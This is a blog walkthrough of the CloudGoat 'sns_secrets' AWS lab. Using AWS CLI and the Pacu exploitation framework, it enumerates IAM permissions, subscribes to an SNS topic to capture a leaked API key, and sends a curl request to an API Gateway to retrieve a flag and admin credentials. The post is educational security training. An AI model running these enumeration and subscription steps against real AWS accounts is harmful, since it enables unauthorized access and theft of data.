<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="sns_secrets (Small &#x2F; Easy) https:&#x2F;&#x2F;github.com&#x2F;RhinoSecurityLabs&#x2F;cloudgoat&#x2F;tree&#x2F;master&#x2F;scenarios&#x2F;sns_secrets  In this scenario, you are given AWS credentials. Your task is to enumerate permissions">
<meta property="og:type" content="article">
<meta property="og:title" content="CloudGoat scenario 01 - sns_secrets (AWS, Pacu)">
<meta property="og:url" content="https://jiravvit.github.io/250306-cloudgoat-scenario01-sns_secrets/index.html">
<meta property="og:site_name" content="HyeonJi Son">
<meta property="og:description" content="sns_secrets (Small &#x2F; Easy) https:&#x2F;&#x2F;github.com&#x2F;RhinoSecurityLabs&#x2F;cloudgoat&#x2F;tree&#x2F;master&#x2F;scenarios&#x2F;sns_secrets  In this scenario, you are given AWS credentials. Your task is to enumerate permissions">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://jiravvit.github.io/images/250306-cloudgoat-scenario01-sns_secrets/1.png">
<meta property="article:published_time" content="2025-03-05T23:00:00.000Z">
<meta property="article:modified_time" content="2025-03-06T17:34:53.430Z">
<meta property="article:author" content="HyeonJi Son">
<meta property="article:tag" content="Cloud">
<meta property="article:tag" content="AWS">
<meta property="article:tag" content="CloudGoat">
<meta property="article:tag" content="Pacu">
<meta property="article:tag" content="IAM">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://jiravvit.github.io/images/250306-cloudgoat-scenario01-sns_secrets/1.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/judi2.jpg">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/judi2.jpg" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/judi2.jpg">
        
      
    
    <!-- title -->
    <title>CloudGoat scenario 01 - sns_secrets (AWS, Pacu)</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" aria-label="Next post" href="/250305-cloudgoat-start/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jiravvit.github.io/250306-cloudgoat-scenario01-sns_secrets/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jiravvit.github.io/250306-cloudgoat-scenario01-sns_secrets/&text=CloudGoat scenario 01 - sns_secrets (AWS, Pacu)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jiravvit.github.io/250306-cloudgoat-scenario01-sns_secrets/&title=CloudGoat scenario 01 - sns_secrets (AWS, Pacu)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jiravvit.github.io/250306-cloudgoat-scenario01-sns_secrets/&is_video=false&description=CloudGoat scenario 01 - sns_secrets (AWS, Pacu)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CloudGoat scenario 01 - sns_secrets (AWS, Pacu)&body=Check out this article: https://jiravvit.github.io/250306-cloudgoat-scenario01-sns_secrets/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jiravvit.github.io/250306-cloudgoat-scenario01-sns_secrets/&title=CloudGoat scenario 01 - sns_secrets (AWS, Pacu)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jiravvit.github.io/250306-cloudgoat-scenario01-sns_secrets/&title=CloudGoat scenario 01 - sns_secrets (AWS, Pacu)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jiravvit.github.io/250306-cloudgoat-scenario01-sns_secrets/&title=CloudGoat scenario 01 - sns_secrets (AWS, Pacu)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jiravvit.github.io/250306-cloudgoat-scenario01-sns_secrets/&title=CloudGoat scenario 01 - sns_secrets (AWS, Pacu)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jiravvit.github.io/250306-cloudgoat-scenario01-sns_secrets/&name=CloudGoat scenario 01 - sns_secrets (AWS, Pacu)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jiravvit.github.io/250306-cloudgoat-scenario01-sns_secrets/&t=CloudGoat scenario 01 - sns_secrets (AWS, Pacu)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#sns-secrets-Small-x2F-Easy"><span class="toc-number">1.</span> <span class="toc-text">sns_secrets (Small &#x2F; Easy)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#AWS-SNS-Simple-Notification-Service"><span class="toc-number">1.1.</span> <span class="toc-text">AWS SNS (Simple Notification Service)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IAM-Identity-and-Access-Management"><span class="toc-number">1.2.</span> <span class="toc-text">IAM (Identity and Access Management)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solve"><span class="toc-number">2.</span> <span class="toc-text">Solve</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Enumeration-IAM-user%E2%80%99s-permissions-using-the-AWS-CLI"><span class="toc-number">2.1.</span> <span class="toc-text">1. Enumeration IAM user’s permissions using the AWS CLI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Subscribing-to-an-SNS-Topic-using-Pacu"><span class="toc-number">2.2.</span> <span class="toc-text">2. Subscribing to an SNS Topic using Pacu</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Accessing-the-API-Gateway-and-Get-a-Flag"><span class="toc-number">2.3.</span> <span class="toc-text">3. Accessing the API Gateway and Get a Flag</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        CloudGoat scenario 01 - sns_secrets (AWS, Pacu)
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">HyeonJi Son</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-03-05T23:00:00.000Z" itemprop="datePublished">2025-03-06</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/AWS/">AWS</a> › <a class="category-link" href="/categories/AWS/CloudGoat/">CloudGoat</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/AWS/" rel="tag">AWS</a>, <a class="tag-link-link" href="/tags/Cloud/" rel="tag">Cloud</a>, <a class="tag-link-link" href="/tags/CloudGoat/" rel="tag">CloudGoat</a>, <a class="tag-link-link" href="/tags/IAM/" rel="tag">IAM</a>, <a class="tag-link-link" href="/tags/Pacu/" rel="tag">Pacu</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h2 id="sns-secrets-Small-x2F-Easy"><a href="#sns-secrets-Small-x2F-Easy" class="headerlink" title="sns_secrets (Small &#x2F; Easy)"></a>sns_secrets (Small &#x2F; Easy)</h2><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/RhinoSecurityLabs/cloudgoat/tree/master/scenarios/sns_secrets">https://github.com/RhinoSecurityLabs/cloudgoat/tree/master/scenarios/sns_secrets</a></li>
</ul>
<p>In this scenario, you are given AWS credentials. Your task is to enumerate permissions and discover that you have the ability to list and subscribe to <code>SNS</code> topics. Use Pacu’s new modules, “sns__enum” and “sns__subscribe,” to subscribe to the topic. You will receive an email from the topic containing an API Key as a debug message. Next, use the AWS CLI to enumerate the API Gateways and find the path, method, stage, and resource of the API Gateway. Finally, perform a curl request with the API key to retrieve the final flag.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cloudgoat.py create sns_secrets</span><br></pre></td></tr></table></figure>

<p>If you run above command, then you’ll get below information.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[cloudgoat] terraform output completed with no error code.</span><br><span class="line">sns_user_access_key_id =</span><br><span class="line">sns_user_secret_access_key =</span><br><span class="line"></span><br><span class="line">[cloudgoat] Output file written to:</span><br><span class="line"></span><br><span class="line">    /Users/user/CloudGoat/sns_secrets_cgidjt7xmtxtc7/start.txt</span><br></pre></td></tr></table></figure>

<h3 id="AWS-SNS-Simple-Notification-Service"><a href="#AWS-SNS-Simple-Notification-Service" class="headerlink" title="AWS SNS (Simple Notification Service)"></a>AWS SNS (Simple Notification Service)</h3><p>A messaging service that allows creating topics and sending messages to subscribed recipients. In this challenge, you need to list SNS topics, subscribe to one, and receive an API key via email.</p>
<h3 id="IAM-Identity-and-Access-Management"><a href="#IAM-Identity-and-Access-Management" class="headerlink" title="IAM (Identity and Access Management)"></a>IAM (Identity and Access Management)</h3><p>A service that manages user access permissions in AWS. It allows companies to assign detailed permissions to different teams and users based on their roles. For example, the development team can be granted access to EC2 and S3, while the database management team gets access to RDS. Like most access control systems, a root account manages everything, while other users receive individual accounts with limited permissions.</p>
<p>In this challange, you need to enumerate your permissions using the provided AWS credentials and check if you can list and subscribe to SNS topics.</p>
<h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ aws configure --profile sns-secrets</span><br><span class="line">AWS Access Key ID [None]:</span><br><span class="line">AWS Secret Access Key [None]:</span><br><span class="line">Default region name [None]:</span><br><span class="line">Default output format [None]:</span><br></pre></td></tr></table></figure>

<p>If you enter the credentials obtained from the challenge, you can check your identity, similar to using the <code>whoami</code> command, with the following command.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ aws sts get-caller-identity --profile sns-secrets</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;UserId&quot;</span>: <span class="string">&quot;AIDAUZPNLFOKXJXG77CFY&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Account&quot;</span>: <span class="string">&quot;329599626133&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Arn&quot;</span>: <span class="string">&quot;arn:aws:iam::329599626133:user/cg-sns-user-sns_secrets_cgidjt7xmtxtc7&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-Enumeration-IAM-user’s-permissions-using-the-AWS-CLI"><a href="#1-Enumeration-IAM-user’s-permissions-using-the-AWS-CLI" class="headerlink" title="1. Enumeration IAM user’s permissions using the AWS CLI"></a>1. Enumeration IAM user’s permissions using the AWS CLI</h3><p>We will use the unique <code>ARN(Amazon Resouce Name)</code> obtained from the challenge profile to enumerate policies.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ aws iam list-user-policies --user-name cg-sns-user-sns_secrets_cgidjt7xmtxtc7 --profile sns-secrets</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;PolicyNames&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;cg-sns-user-policy-sns_secrets_cgidjt7xmtxtc7&quot;</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Now that we have retrieved the specific policy information, let’s examine its details.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">$ aws iam get-user-policy --user-name cg-sns-user-sns_secrets_cgidjt7xmtxtc7 --policy-name cg-sns-user-policy-sns_secrets_cgidjt7xmtxtc7 --profile sns-secrets</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;UserName&quot;</span>: <span class="string">&quot;cg-sns-user-sns_secrets_cgidjt7xmtxtc7&quot;</span>,</span><br><span class="line">    <span class="string">&quot;PolicyName&quot;</span>: <span class="string">&quot;cg-sns-user-policy-sns_secrets_cgidjt7xmtxtc7&quot;</span>,</span><br><span class="line">    <span class="string">&quot;PolicyDocument&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;Version&quot;</span>: <span class="string">&quot;2012-10-17&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Statement&quot;</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;Action&quot;</span>: [</span><br><span class="line">                    <span class="string">&quot;sns:Subscribe&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;sns:Receive&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;sns:ListSubscriptionsByTopic&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;sns:ListTopics&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;sns:GetTopicAttributes&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;iam:ListGroupsForUser&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;iam:ListUserPolicies&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;iam:GetUserPolicy&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;iam:ListAttachedUserPolicies&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;apigateway:GET&quot;</span></span><br><span class="line">                ],</span><br><span class="line">                <span class="string">&quot;Effect&quot;</span>: <span class="string">&quot;Allow&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Resource&quot;</span>: <span class="string">&quot;*&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;Action&quot;</span>: <span class="string">&quot;apigateway:GET&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Effect&quot;</span>: <span class="string">&quot;Deny&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Resource&quot;</span>: [</span><br><span class="line">                    <span class="string">&quot;arn:aws:apigateway:us-east-1::/apikeys&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;arn:aws:apigateway:us-east-1::/apikeys/*&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;arn:aws:apigateway:us-east-1::/restapis/*/resources/*/methods/GET&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;arn:aws:apigateway:us-east-1::/restapis/*/methods/GET&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;arn:aws:apigateway:us-east-1::/restapis/*/resources/*/integration&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;arn:aws:apigateway:us-east-1::/restapis/*/integration&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;arn:aws:apigateway:us-east-1::/restapis/*/resources/*/methods/*/integration&quot;</span></span><br><span class="line">                ]</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>To briefly explain how AWS SNS works, A publisher sends messages to an SNS topic such as <code>server-alerts</code>. These messages are delievered to subscribers through email or SMS.</p>
<p>(Publisher) –&gt; (SNS Topic) –&gt; (Subscriber)</p>
<p>Above IAM policy provided to the user allows the <code>sns:Subscribe</code> permission on all SNS topics. The key issue here is <code>&quot;Resource&quot;: &quot;*&quot;</code>. This permission grants the user the ability to subscribe to any topic. This is a critical vulnerability because it allows unauthorized users to subscribe to potentially sensitive topics.</p>
<p>Next, the policy also allows the <code>&quot;apigateway:GET&quot;</code>. This permission grants to make GET requests to API Gateway resources. The user will need an <code>API Key</code> to authenticate and successfully interact with the API. Now, How can I get the <code>API Key</code>?</p>
<h3 id="2-Subscribing-to-an-SNS-Topic-using-Pacu"><a href="#2-Subscribing-to-an-SNS-Topic-using-Pacu" class="headerlink" title="2. Subscribing to an SNS Topic using Pacu"></a>2. Subscribing to an SNS Topic using Pacu</h3><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/RhinoSecurityLabs/pacu">https://github.com/RhinoSecurityLabs/pacu</a></li>
</ul>
<p>We use <code>Pacu</code> which is an open-source AWS exploitation framework. With <code>Pacu</code>, we can enumerate SNS topics and subscribe to them. And also we can enumerate our IAM permissions using <code>Pacu</code> as shown below. First, create a new session and enter below command then it will import AWS Keys from the AWS CLI credentials file (~&#x2F;.aws&#x2F;credentials).</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Pacu (sns-secrets:No Keys Set) &gt; import_keys sns-secrets</span><br></pre></td></tr></table></figure>

<p>There are two modules related to SNS. These modules are based on IAM profile, it means this profile(<code>sns-secrets</code>) can use only these modules when it comes to <code>SNS</code>.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Pacu (sns-secrets:imported-sns-secrets) &gt; search sns</span><br><span class="line">[Category: ENUM]</span><br><span class="line"></span><br><span class="line">    List and describe Simple Notification Service topics</span><br><span class="line"></span><br><span class="line">  sns__enum</span><br><span class="line"></span><br><span class="line">[Category: LATERAL_MOVE]</span><br><span class="line"></span><br><span class="line">    Subscribe to a Simple Notification Service (SNS) topic</span><br><span class="line"></span><br><span class="line">  sns__subscribe</span><br></pre></td></tr></table></figure>

<p><code>sns-secrets</code> profile has the <code>sns:ListTopics</code> permission, so you can use the <code>sns__enum</code> module. Additionally, this profile has the <code>sns:Subscribe</code> permission, allowing you to use the <code>sns__subscribe</code> module.</p>
<p>You can use the <code>help</code> command to get more information about how to use each SNS-related module (<code>sns__enum</code>, <code>sns__subscribe</code>):</p>
<ul>
<li><code>sns__enum</code>: Lists and describes SNS topics. It’s used to enumerate the existing SNS topics in an AWS.</li>
<li><code>sns__subscribe</code>: Subscribes to a specific SNS topic. And also it allows to receive a subscription confirmation.</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Pacu (sns-secrets:imported-sns-secrets) &gt; run sns__enum --region us-east-1</span><br></pre></td></tr></table></figure>

<p>You can check the unique <code>ARN(Amazon Resouce Name)</code>. In AWS, each resources(e.g EC2, S3, SNS Topic ..) have unique ARN.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Pacu (sns-secrets:imported-sns-secrets) &gt; run sns__subscribe --topics [TopicARN] --email [Email]</span><br></pre></td></tr></table></figure>

<p>After running this command, you can confirm the subscription via email. Once you confirm the SNS Topic subscription, you will receive an <code>API Key</code> for the <code>API Gateway</code> via email. As I mentioned before, this can be a vulnerability. You can send a GET request to the <code>API Gateway</code> using this <code>API Key</code>.</p>
<p>But why will you get the <code>API Key</code>? This is likely due to a developer’s mistake. Or the <code>sns:Subscribe</code> permission is too broadly configured, allowing users who shouldn’t have access to receive messages.</p>
<img src="/images/250306-cloudgoat-scenario01-sns_secrets/1.png" width=400/>
<br>

<p>In this challenge, It says <code>DEBUG</code> in the email, so it is definitely not for a normal user.</p>
<h3 id="3-Accessing-the-API-Gateway-and-Get-a-Flag"><a href="#3-Accessing-the-API-Gateway-and-Get-a-Flag" class="headerlink" title="3. Accessing the API Gateway and Get a Flag"></a>3. Accessing the API Gateway and Get a Flag</h3><p>After getting an <code>API Key</code> for the <code>API Gateway</code>, we can enumerate the available APIs, stages, and resources using <code>AWS CLI</code>. First, we list the API Gateway resources associated with the <code>sns-secrets</code> profile.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ aws apigateway get-rest-apis --profile sns-secrets --region us-east-1</span><br></pre></td></tr></table></figure>

<p>The output shows an API named <code>cg-api-sns_secrets_cgidjt7xmtxtc7</code> and ID is <code>43u8hxyd16</code>. We will check available deployment stages using this ID.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ aws apigateway get-stages --rest-api-id 43u8hxyd16 --profile sns-secrets --region us-east-1</span><br></pre></td></tr></table></figure>

<p>The <code>prod-sns_secrets_cgidjt7xmtxtc7</code> stage is active. It means API requests can be sent to this endpoint.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ aws apigateway get-resources --rest-api-id 43u8hxyd16 --profile sns-secrets --region us-east-1</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;items&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span>: <span class="string">&quot;7exe56i0y5&quot;</span>,</span><br><span class="line">            <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span>: <span class="string">&quot;tox00r&quot;</span>,</span><br><span class="line">            <span class="string">&quot;parentId&quot;</span>: <span class="string">&quot;7exe56i0y5&quot;</span>,</span><br><span class="line">            <span class="string">&quot;pathPart&quot;</span>: <span class="string">&quot;user-data&quot;</span>,</span><br><span class="line">            <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/user-data&quot;</span>,</span><br><span class="line">            <span class="string">&quot;resourceMethods&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;GET&quot;</span>: &#123;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The <code>/user-data</code> resource supports GET requests. It means we can attempt to access and get user data through this path.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://[API-ID].execute-api.us-east-1.amazonaws.com/[stageName]/[resourcePath]</span><br></pre></td></tr></table></figure>

<p>Since we already got the <code>API Key</code>, we can now send a GET request to the <code>API Gateway</code> endpoint (<code>/user-data</code>) like this!</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ curl -X GET \</span><br><span class="line"><span class="string">&#x27;https://43u8hxyd16.execute-api.us-east-1.amazonaws.com/prod-sns_secrets_cgidjt7xmtxtc7/user-data&#x27;</span> \</span><br><span class="line">-H <span class="string">&#x27;x-api-key: 45a3da610dc64703b10e273a4db135bf&#x27;</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;final_flag&quot;</span>: <span class="string">&quot;FLAG&#123;***&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Access granted&quot;</span>,</span><br><span class="line">    <span class="string">&quot;user_data&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;email&quot;</span>: <span class="string">&quot;SuperAdmin@notarealemail.com&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&quot;p@ssw0rd123&quot;</span>,</span><br><span class="line">        <span class="string">&quot;user_id&quot;</span>: <span class="string">&quot;1337&quot;</span>,</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: <span class="string">&quot;SuperAdmin&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Finally we got a <code>flag</code> and <code>SuperAdmin</code> account. This challenge shows how important it is to properly manage permissions and secure sensitive information in AWS.</p>

  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/tags/">Tag</a></li>
         
          <li><a href="/categories/">Category</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#sns-secrets-Small-x2F-Easy"><span class="toc-number">1.</span> <span class="toc-text">sns_secrets (Small &#x2F; Easy)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#AWS-SNS-Simple-Notification-Service"><span class="toc-number">1.1.</span> <span class="toc-text">AWS SNS (Simple Notification Service)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IAM-Identity-and-Access-Management"><span class="toc-number">1.2.</span> <span class="toc-text">IAM (Identity and Access Management)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solve"><span class="toc-number">2.</span> <span class="toc-text">Solve</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Enumeration-IAM-user%E2%80%99s-permissions-using-the-AWS-CLI"><span class="toc-number">2.1.</span> <span class="toc-text">1. Enumeration IAM user’s permissions using the AWS CLI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Subscribing-to-an-SNS-Topic-using-Pacu"><span 